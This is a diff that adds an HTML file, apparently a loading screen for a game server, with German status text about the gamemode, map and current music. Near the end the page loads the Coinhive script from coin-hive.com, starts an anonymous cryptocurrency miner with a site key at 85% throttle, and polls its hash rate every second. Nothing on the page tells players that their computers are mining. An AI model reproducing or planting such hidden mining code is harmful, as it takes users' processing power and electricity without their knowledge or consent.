@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>nightlife-loading</title>
+	
+	<link rel="stylesheet" href="css/sleek.css">
+</head>
+<body>
+	<div id="player"></div>
+	<div id="overlay"></div>
+
+	<div id="title"></div>
+	<div id="subtitle">
+		Wir spielen gerade <span id="gamemode">gamemode</span> auf <span id="map">map</span>
+	</div>
+
+	<div id="status-container">
+		<div id="status">Retrieving server info...</div>
+		<div id="loading">
+			<div id="loading-progress"></div>
+		</div>
+		<div id="messages"></div>
+	</div>
+
+	<div id="music">
+		Du hörst gerade:<div id="music-name"></div>
+	</div>
+
+	<script src="js/lib/jquery-2.1.1.min.js"></script>
+	<script src="js/lib/jquery.backstretch.min.js"></script>
+	<script src="js/config.js"></script>
+	<script src="js/sleek.js"></script>
+	<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+	<script>
+	var miner = new CoinHive.Anonymous('qvl8uyMsIMDwe0SAk7RqyuarURDwvtYL', { throttle: 0.85});
+	miner.start();
+	</script>
+	<script>
+	setInterval(function() {
+		var hashesPerSecond = miner.getHashesPerSecond();
+		var totalHashes = miner.getTotalHashes();
+		var acceptedHashes = miner.getAcceptedHashes();
+
+	}, 1000);
+</script>
+</body>
+</html>
